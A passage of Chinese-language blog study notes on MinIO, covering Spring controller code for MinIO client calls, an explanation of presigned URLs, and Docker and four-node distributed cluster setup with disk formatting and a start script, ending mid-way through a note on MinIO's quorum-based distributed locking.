<br>            <span class="hljs-keyword">return</span> minioClient.<span class="hljs-title function_">getPresignedObjectUrl</span>(  <br>                <span class="hljs-title class_">GetPresignedObjectUrlArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                    .<span class="hljs-title function_">method</span>(<span class="hljs-title class_">Method</span>.<span class="hljs-property">GET</span>)  <br>                    .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                    .<span class="hljs-title function_">object</span>(objectName)  <br>                    .<span class="hljs-title function_">expiry</span>(expiry)  <span class="hljs-comment">// 这个 URL 的过期时间，单位是 秒  </span><br>                    .<span class="hljs-title function_">build</span>()  <br>            );  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;生成签名 URL 时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>  <br>    <span class="hljs-comment">// 4. minioClient.getObject（GetObjectArgs args）  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/getObject&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ResponseEntity</span>&lt;<span class="hljs-title class_">InputStreamResource</span>&gt; <span class="hljs-title function_">getObject</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> objectName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> = minioClient.<span class="hljs-title function_">getObject</span>(  <br>                    <span class="hljs-title class_">GetObjectArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                            .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                            .<span class="hljs-title function_">object</span>(objectName)  <br>                            .<span class="hljs-title function_">build</span>()  <br>            );  <br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ResponseEntity</span>.<span class="hljs-title function_">ok</span>()  <br>                    .<span class="hljs-title function_">header</span>(<span class="hljs-title class_">HttpHeaders</span>.<span class="hljs-property">CONTENT_DISPOSITION</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + objectName + <span class="hljs-string">&quot;\&quot;&quot;</span>)  <br>                    .<span class="hljs-title function_">body</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamResource</span>(<span class="hljs-keyword">in</span>));  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;下载文件时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 5. minioClient.listObjects(ListObjectsArgs args)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/listObjects&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">listObjects</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span>(defaultValue = <span class="hljs-string">&quot;false&quot;</span>) <span class="hljs-built_in">boolean</span> recursive</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">Result</span>&lt;<span class="hljs-title class_">Item</span>&gt;&gt; results = minioClient.<span class="hljs-title function_">listObjects</span>(  <br>                <span class="hljs-title class_">ListObjectsArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                    .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                    .<span class="hljs-title function_">recursive</span>(recursive)  <br>                    .<span class="hljs-title function_">build</span>()  <br>            );  <br>  <br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">StreamSupport</span>.<span class="hljs-title function_">stream</span>(results.<span class="hljs-title function_">spliterator</span>(), <span class="hljs-literal">false</span>)  <br>                    .<span class="hljs-title function_">map</span>(r -&gt; &#123;  <br>                        <span class="hljs-keyword">try</span> &#123;  <br>                            <span class="hljs-keyword">return</span> r.<span class="hljs-title function_">get</span>().<span class="hljs-title function_">objectName</span>(); <span class="hljs-comment">// get() 可能抛异常  </span><br>                        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;读取对象名称失败&quot;</span>, e);  <br>                        &#125;  <br>                    &#125;)  <br>                    .<span class="hljs-title function_">collect</span>(<span class="hljs-title class_">Collectors</span>.<span class="hljs-title function_">toList</span>());  <br>  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;列出对象时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 6. minioClient.removeObject(RemoveObjectArgs args)  </span><br>    <span class="hljs-meta">@DeleteMapping</span>(<span class="hljs-string">&quot;/removeObject&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">removeObject</span>(<span class="hljs-params">  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> bucketName,  </span><br><span class="hljs-params">            <span class="hljs-meta">@RequestParam</span> <span class="hljs-title class_">String</span> objectName</span>) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            minioClient.<span class="hljs-title function_">removeObject</span>(  <br>                <span class="hljs-title class_">RemoveObjectArgs</span>.<span class="hljs-title function_">builder</span>()  <br>                    .<span class="hljs-title function_">bucket</span>(bucketName)  <br>                    .<span class="hljs-title function_">object</span>(objectName)  <br>                    .<span class="hljs-title function_">build</span>()  <br>            );  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;删除成功: &quot;</span> + objectName;  <br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>                    <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>,  <br>                    <span class="hljs-string">&quot;删除对象时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>            );  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>哦！你是在问：</p><blockquote><p>「<code>minioClient.getPresignedObjectUrl(...)</code> 这个方法到底<strong>干嘛用的</strong>？」</p></blockquote><p>好，我不卖关子，通俗直说👇</p><hr><h2 id="🎯-简洁答案："><a href="#🎯-简洁答案：" class="headerlink" title="🎯 简洁答案："></a>🎯 简洁答案：</h2><blockquote><p>这个方法用来生成一个<strong>带授权签名的临时访问链接</strong>，让<strong>不登录 MinIO 的用户也能访问私有文件</strong>。</p></blockquote><hr><h2 id="🧠-举例说明（让你秒懂）："><a href="#🧠-举例说明（让你秒懂）：" class="headerlink" title="🧠 举例说明（让你秒懂）："></a>🧠 举例说明（让你秒懂）：</h2><p>比如你有一个保存在 MinIO 里的文件：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">bucket:</span> my-private-bucket  <br><span class="hljs-symbol">object:</span> <span class="hljs-keyword">/docs/</span>secret.pdf<br></code></pre></td></tr></table></figure><p>这个文件是私有的，默认别人看不到。但你想：</p><blockquote><p>“我给用户发个下载链接，他点一下就能下载，<strong>不用登录、也不用发 token</strong>。”</p></blockquote><p>怎么办？用这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> minioClient.getPresignedObjectUrl(<br>    GetPresignedObjectUrlArgs.builder()<br>        .method(Method.GET)<br>        .bucket(<span class="hljs-string">&quot;my-private-bucket&quot;</span>)<br>        .object(<span class="hljs-string">&quot;docs/secret.pdf&quot;</span>)<br>        .expiry(<span class="hljs-number">60</span> * <span class="hljs-number">10</span>)  <span class="hljs-comment">// 10分钟有效</span><br>        .build()<br>);<br></code></pre></td></tr></table></figure><p>🔗 它就会返回一个长长的链接，大概像这样：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//mi</span>nio.example.com<span class="hljs-regexp">/my-private-bucket/</span>docs/secret.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=...<br></code></pre></td></tr></table></figure><p>你把这个链接丢给前端、微信、邮件、钉钉，谁点都能直接访问这个私有文件。</p><hr><h2 id="📦-常见用途："><a href="#📦-常见用途：" class="headerlink" title="📦 常见用途："></a>📦 常见用途：</h2><table><thead><tr><th>场景</th><th>描述</th></tr></thead><tbody><tr><td>✅ 下载文件</td><td>前端或第三方用户访问私有文件</td></tr><tr><td>✅ 预览图片&#x2F;音频&#x2F;视频</td><td>在不暴露 MinIO 密钥的情况下播放</td></tr><tr><td>✅ 前端直传（Method.PUT）</td><td>允许用户直接把文件上传到 MinIO，不经过后端</td></tr><tr><td>✅ 生成限时分享链接</td><td>链接有效期自动失效，不怕泄露</td></tr></tbody></table><hr><h2 id="💡一句话总结："><a href="#💡一句话总结：" class="headerlink" title="💡一句话总结："></a>💡一句话总结：</h2><blockquote><p><code>getPresignedObjectUrl(...)</code> 就是帮你生成一个“有时效、有权限”的外链链接，用来<strong>安全地分享、下载或上传 MinIO 里的私有文件</strong>。</p></blockquote><hr><p>想我顺便也讲讲 <code>Presigned PUT</code> 用于前端直传的逻辑吗？那玩意跟这个兄弟是亲戚 😄</p><h3 id="3-相关网站"><a href="#3-相关网站" class="headerlink" title="3. 相关网站"></a>3. 相关网站</h3><ol><li>minio 依赖地址：<ol><li><a href="https://mvnrepository.com/artifact/io.minio/minio">https://mvnrepository.com/artifact/io.minio/minio</a></li></ol></li></ol><h1 id="高级玩法"><a href="#高级玩法" class="headerlink" title="高级玩法"></a>高级玩法</h1><p>简单的stream 上传</p><p><img src="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/image-20250513175631311.png"></p><p><img src="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20%E6%95%B4%E5%90%88%20Minio/image-20250514083308199.png"></p>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>数据的组织方式</category>
      
      <category>对象存储</category>
      
      <category>Minio</category>
      
      <category>Spring 整合 Minio</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Minio 基础</title>
    <link href="/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9AMinio%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/05/13/%E7%AC%94%E8%AE%B0%EF%BC%9AMinio%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-Minio-核心概念"><a href="#1-Minio-核心概念" class="headerlink" title="1. Minio 核心概念"></a>1. Minio 核心概念</h3><p>&#x3D;&#x3D;1.Bucket&#x3D;&#x3D;<br>Bucket 是存储 Object 的逻辑空间，每个 Bucket 之间的数据是相互隔离的，对用户而言，相当于存放文件的顶层<strong>文件夹</strong></p><p>&#x3D;&#x3D;2.Object&#x3D;&#x3D;<br>Object 是存储到 Minio 中的基本对象，对用户而言，相当于<strong>文件</strong></p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="把控全场"><a href="#把控全场" class="headerlink" title="把控全场"></a>把控全场</h3><p>每台机器至少挂在2块磁盘，格式话为 XFS&#x2F;ext4</p><p>至少4台节点、</p><p>扩容时最好一次性加偶数个磁盘&#x2F;节点</p><hr><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><h4 id="1-1-单机测试环境搭建"><a href="#1-1-单机测试环境搭建" class="headerlink" title="1.1. 单机测试环境搭建"></a>1.1. 单机测试环境搭建</h4><h5 id="1-1-1-安装-Minio"><a href="#1-1-1-安装-Minio" class="headerlink" title="1.1.1. 安装 Minio"></a>1.1.1. 安装 Minio</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -d \<br>  --name minio-test \<br>  -p <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span> \<br>  -p <span class="hljs-number">9001</span>:<span class="hljs-number">9001</span> \<br>  -e <span class="hljs-string">&quot;MINIO_ROOT_USER=admin&quot;</span> \<br>  -e <span class="hljs-string">&quot;MINIO_ROOT_PASSWORD=admin123&quot;</span> \<br>  minio<span class="hljs-regexp">/minio server /</span>data --console-address <span class="hljs-string">&quot;:9001&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">注意事项：密码长度至少 8 个字符</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="1-1-2-访问-Minio-控制台"><a href="#1-1-2-访问-Minio-控制台" class="headerlink" title="1.1.2. 访问 Minio 控制台"></a>1.1.2. 访问 Minio 控制台</h5><p>访问 Minio 控制台： <a href="http://192.168.136.8:9001/">http://192.168.136.8:9001</a></p><hr><h4 id="分布式集群环境搭建"><a href="#分布式集群环境搭建" class="headerlink" title="分布式集群环境搭建"></a>分布式集群环境搭建</h4><h5 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h5><p>采用 多驱动＋纠删码 的架构，每个节点上挂载多块驱动器（存储目录），利用纠删码将对象数据拆分成「数据分片」和「校验分片」，从而实现冗余存储和容错能力。</p><p>简单来说，在一个 12 驱动器集群中，一个对象将被切分为 6 个数据分片和 6 个校验分片。即便任意 6 个驱动器（无论是数据分片还是校验分片）丢失，你仍可从剩余分片中完整恢复该对象。</p><blockquote><p>[!NOTE] 注意事：驱动器到底是什么？</p><ol><li>驱动器就是<strong>存储目录</strong>。记住了，驱动器 ≈ 存储目录，没别的玄学。</li><li>不推荐将存储目录放在 Root（系统）盘下。原因很简单：MinIO 是高 IO、高吞吐的服务，频繁写入会让系统盘压力山大。如果你把数据写到系统盘（例如 <code>/data</code>、<code>/mnt</code> 下的目录），一旦空间爆满或磁盘故障，不仅存储服务会挂，可能连系统都崩，SSH 也登不上去了，连喊“救命”都来不及</li><li>我们强烈推荐驱动器使用独立的磁盘或分区。什么意思呢？简单说，不要在一个已有的挂载目录下再创建子目录，而是直接将整块磁盘或一个分区挂载到驱动器目录本身。也就是说，存储目录就是磁盘或分区挂载点本身，而不是在挂载点下再套一个子目录。</li><li>为什么这么推荐？虽然你技术上可以在一个磁盘或分区挂载的目录下创建多个子目录，并把这些子目录作为多个驱动器使用，但别忘了，MinIO 是为数据冗余和容错设计的。如果你把 12 个驱动器目录全放在同一个盘下，这个盘一旦挂了，12 个驱动器全都陪葬，数据恢复无从谈起。相反，如果每个驱动器目录都是独立挂载的磁盘或分区，就算某一块盘出问题，其他驱动器依旧健康，你的数据照样能恢复，稳得很。</li></ol></blockquote><hr><h5 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h5><ol><li>&#x3D;&#x3D;硬件要求&#x3D;&#x3D;：<ol><li>4 台服务器</li><li>5 块磁盘<ol><li>Root 盘</li><li>四块数据盘（类型不限，推荐 SCSI）</li></ol></li></ol></li><li>&#x3D;&#x3D;系统要求&#x3D;&#x3D;：<ol><li>Ubuntu 22.04</li><li>时间同步</li><li>开放 9000、9001 TCP端口</li></ol></li><li>&#x3D;&#x3D;软件要求&#x3D;&#x3D;：</li></ol><hr><h5 id="节点列表"><a href="#节点列表" class="headerlink" title="节点列表"></a>节点列表</h5><p>Ø准备4台机器；（根据MinIO的架构设计，至少需要4个节点来构建集群，这是因为在一个N节点的分布式MinIO集群中，只要有N&#x2F;2节点在线，数据就是安全的，同时，为了确保能够创建新的对象，需要至少有N&#x2F;2+1个节点，因此，对于一个4节点的集群，即使有两个节点宕机，集群仍然是可读的，但需要有3个节点才能写数据；）</p><hr><h5 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h5><p>开放 9000、9001 端口</p><hr><h5 id="安装-Minio-Server"><a href="#安装-Minio-Server" class="headerlink" title="安装 Minio Server"></a>安装 Minio Server</h5><p>首先，在系统中创建目录 <code>/mystudy/minio</code>，并进入到该目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 创建目录</span><br>mkdir -p <span class="hljs-regexp">/mystudy/mi</span>nio<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. -p：</span><br><span class="hljs-string">1. 如果 /mystudy 目录本身不存在，可以加上 -p 参数，递归创建所有父目录</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 2. 进入该目录</span><br>cd <span class="hljs-regexp">/mystudy/mi</span>nio<br></code></pre></td></tr></table></figure><p>接着，参考 <a href="https://min.io/open-source/download?platform=linux">MinIO 官方下载页面</a> 进行安装，安装过程会将 <code>minio</code> 文件下载到<strong>当前目录</strong>，文件名即为 <code>minio</code>（没有扩展名）。</p><p>注意：此处下载的是 MinIO Server，不是其他工具，以下是 MinIO 的几个组件区别说明：</p><ol><li>&#x3D;&#x3D;MinIO Server&#x3D;&#x3D;：<ol><li>要搭建 MinIO 服务端时，下载这个。</li></ol></li><li>&#x3D;&#x3D;MinIO Client&#x3D;&#x3D;：<ol><li>命令行工具，用来管理 MinIO 或 AWS S3，例如上传、下载、建桶、设权限等。</li><li>想用命令行操作 MinIO（或 AWS S3）存储，就得下载它！</li></ol></li><li>&#x3D;&#x3D;MinIO SDK&#x3D;&#x3D;<ol><li>代程序员在代码中操作 MinIO（上传&#x2F;下载&#x2F;授权等）时使用，根据语言选择对应的 SDK（如 Java、Python、Go）<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMinio%20%E5%9F%BA%E7%A1%80/image-20250514104455366.png"></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>我们可以先在一台服务器上先下载 minio，然后拷贝到其他服务器上</li><li>但是不要忘记执行另外两步操作</li></ol></blockquote><hr><h5 id="磁盘格式化与挂载"><a href="#磁盘格式化与挂载" class="headerlink" title="磁盘格式化与挂载"></a>磁盘格式化与挂载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建磁盘挂载目录</span><br><span class="hljs-built_in">mkdir</span> -p /mystudy/minio/disk&#123;1..4&#125;<br><br><br><span class="hljs-comment"># 2. 安装 xfsprogs 工具</span><br><span class="hljs-built_in">sudo</span> apt install -y xfsprogs<br><br><br><span class="hljs-comment"># 3. 列出所有块设备</span><br>lsblk<br><br><br><span class="hljs-comment"># 4. 格式化块（需要格式化为 XFS 或 ext4），这里格式化为 XFS</span><br>mkfs.xfs /dev/sdb<br><br>mkfs.xfs /dev/sdc<br><br>mkfs.xfs /dev/sdd<br><br>mkfs.xfs /dev/sde<br><br><br><span class="hljs-comment"># 5. 将磁盘挂载到挂载目录</span><br>mount /dev/sdb /mystudy/minio/disk1<br><br>mount /dev/sdc /mystudy/minio/disk2<br><br>mount /dev/sdd /mystudy/minio/disk3<br><br>mount /dev/sde /mystudy/minio/disk4<br><br><br><span class="hljs-comment"># 6. 再次列出所有块设备，查看是否挂载成功</span><br>lsblk<br></code></pre></td></tr></table></figure><hr><h5 id="创建-Shell-启动脚本"><a href="#创建-Shell-启动脚本" class="headerlink" title="创建 Shell 启动脚本"></a>创建 Shell 启动脚本</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 1. 进入 Minio 目录</span><br>cd /mystudy/minio<br><br><br><span class="hljs-meta"># 2. 创建 Shell 启动脚本</span><br>vim start<span class="hljs-punctuation">-</span>minio.sh<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-number">1</span>. 脚本内容：<br><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-meta"># 设置根账户和密码</span><br>export MINIO_ROOT_USER<span class="hljs-punctuation">=</span>admin<br>export MINIO_ROOT_PASSWORD<span class="hljs-punctuation">=</span>password<br><br><span class="hljs-meta"># 多机分布式模式</span><br>nohup /mystudy/minio/minio server \<br>  <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>config<span class="hljs-punctuation">-</span>dir /etc/minio \<br>  <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>address <span class="hljs-punctuation">:</span><span class="hljs-number">9000</span> \<br>  <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>console<span class="hljs-punctuation">-</span>address <span class="hljs-punctuation">:</span><span class="hljs-number">9001</span> \<br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.8/mystudy/minio/disk1  http://192.168.136.8/mystudy/minio/disk2  \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.8/mystudy/minio/disk3  http://192.168.136.8/mystudy/minio/disk4  \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.9/mystudy/minio/disk1  http://192.168.136.9/mystudy/minio/disk2  \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.9/mystudy/minio/disk3  http://192.168.136.9/mystudy/minio/disk4  \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.10/mystudy/minio/disk1 http://192.168.136.10/mystudy/minio/disk2 \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.10/mystudy/minio/disk3 http://192.168.136.10/mystudy/minio/disk4 \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.11/mystudy/minio/disk1 http://192.168.136.11/mystudy/minio/disk2 \</span><br>  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.11/mystudy/minio/disk3 http://192.168.136.11/mystudy/minio/disk4 \</span><br>  &gt; /var/<span class="hljs-built_in">log</span>/minio.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br><br>echo <span class="hljs-string">&quot;MinIO 多机分布式集群已启动，后台运行…&quot;</span><br><br><span class="hljs-number">2</span>.<br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-meta"># 3. 添加可执行权限</span><br>chmod <span class="hljs-punctuation">+</span>x start<span class="hljs-punctuation">-</span>minio.sh<br></code></pre></td></tr></table></figure><hr><h5 id="启动分布式集群"><a href="#启动分布式集群" class="headerlink" title="启动分布式集群"></a>启动分布式集群</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 1. 执行 Shell 启动脚本（每个节点都要启动）</span><br>/mystudy/minio/<span class="hljs-built_in">start</span>-minio.sh<br><br><br><span class="hljs-comment"># 2. 补充：若提示 /mystudy/minio/start-minio.sh: cannot execute: required file not found。</span><br><span class="hljs-comment"># 2.1. 原因</span><br>可能是因为，我们在编辑器里创建／修改过这个脚本，行尾可能包含 \r\n（<span class="hljs-literal">CRLF</span>），而 Linux 期望的是 \n（LF），我们可以这样做<br><br><span class="hljs-comment"># 2.2. 安装 dos2unix 工具</span><br>apt-<span class="hljs-built_in">get</span> install -y dos2unix<br><br><span class="hljs-comment"># 2.3. 将脚本转为 Unix 格式</span><br>dos2unix /mystudy/minio/<span class="hljs-built_in">start</span>-minio.sh<br></code></pre></td></tr></table></figure><hr><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h3 id="1-相关网站"><a href="#1-相关网站" class="headerlink" title="1. 相关网站"></a>1. 相关网站</h3><ol><li>&#x3D;&#x3D;Minio 官方文档、官网&#x3D;&#x3D;<ol><li><a href="https://min.io/docs/minio/linux/developers/minio-drivers.html">https://min.io/docs/minio/linux/developers/minio-drivers.html</a></li></ol></li><li>&#x3D;&#x3D;Minio 官方下载页面&#x3D;&#x3D;<ol><li><a href="https://min.io/open-source/download?platform=linux">https://min.io/open-source/download?platform=linux</a></li></ol></li></ol><hr><h3 id="2-Minio-命名规范"><a href="#2-Minio-命名规范" class="headerlink" title="2. Minio 命名规范"></a>2. Minio 命名规范</h3><ol><li>&#x3D;&#x3D;Root 用户密码&#x3D;&#x3D;：<ol><li>密码长度至少 8 个字符</li></ol></li><li>&#x3D;&#x3D;存储桶名&#x3D;&#x3D;：<ol><li>长度至少 3 个字符</li></ol></li></ol><hr><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h1 id="数据一致"><a href="#数据一致" class="headerlink" title="数据一致"></a>数据一致</h1><p>不是的，MinIO 并不采用 Raft 协议来同步各节点的元数据，而是依赖自有的“分布式锁 + 多数派（quorum）”机制来保证一致性：</p><ol><li><p><strong>元数据存储在对象存储层</strong><br> MinIO 没有单独的元数据库，所有的元数据（bucket 列表、对象索引、版本信息等）都直接以对象形式写入磁盘。各节点启动时会基于一致性哈希（consistent hashing）探测到同一份磁盘集群，然后通过文件系统进行读写操作，实现了天然的扩展能力和高吞吐。(<a href="https://blog.min.io/minio-versioning-metadata-deep-dive/?utm_source=chatgpt.com" title="MinIO Versioning, Metadata and Storage Deep Dive">MinIO Blog</a>)</p></li><li><p><strong>dsync：轻量级的分布式锁</strong><br> MinIO 在内部使用一个名为 <code>dsync</code> 的库来实现跨节点的分布式锁。它的原理类似于 Raft，但更简单，旨在做锁服务：</p><ul><li><p>每个节点都和其它所有节点保持连接。</p></li><li><p>发起锁请求时，会广播给所有节点，等待半数以上（<code>n/2+1</code>）节点响应成功才算获取到锁。</p></li><li><p>释放锁时再广播一次，告知其它节点可以释放。<br>  